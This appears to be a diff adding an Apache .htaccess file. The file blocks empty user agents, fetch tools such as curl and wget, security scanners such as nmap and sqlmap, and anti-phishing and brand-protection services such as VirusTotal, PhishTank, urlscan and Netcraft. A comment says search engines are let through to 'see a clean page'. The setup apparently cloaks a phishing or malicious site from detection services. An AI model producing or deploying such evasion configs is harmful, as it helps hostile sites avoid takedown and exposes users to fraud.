@@ -1,0 +1,31 @@
+# Disable directory listing
+Options -Indexes
+
+# Protect sensitive files
+<FilesMatch "\.(txt|log|json|py|sh|bak|swp)$">
+    Order deny,allow
+    Deny from all
+</FilesMatch>
+
+# Protect folders
+<IfModule mod_rewrite.c>
+RewriteEngine On
+
+# 1. Block empty User-Agent
+RewriteCond %{HTTP_USER_AGENT} ^$ [OR]
+RewriteCond %{HTTP_USER_AGENT} ^-?$
+RewriteRule ^.* - [F,L]
+
+# 2. Block known bad bots, scanners, and security tools ONLY (NOT Google/Bing — let them see a clean page)
+RewriteCond %{HTTP_USER_AGENT} (ahrefs|semrush|majestic|rogerbot|exabot|dotbot|mj12bot|curl|wget|python|java|urllib|postman|virustotal|phishtank|urlscan|netcraft|brandverity|masscan|zgrab|nikto|nmap|nuclei|wpscan|acunetix|nessus|detectify|probely|scrapy|burpsuite|havij|sqlmap) [NC]
+RewriteRule ^.* - [F,L]
+</IfModule>
+
+<IfModule mod_headers.c>
+    # Prevent caching of dynamic pages
+    Header set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
+    Header set Pragma "no-cache"
+</IfModule>
+
+# Custom 404
+ErrorDocument 404 /index.php
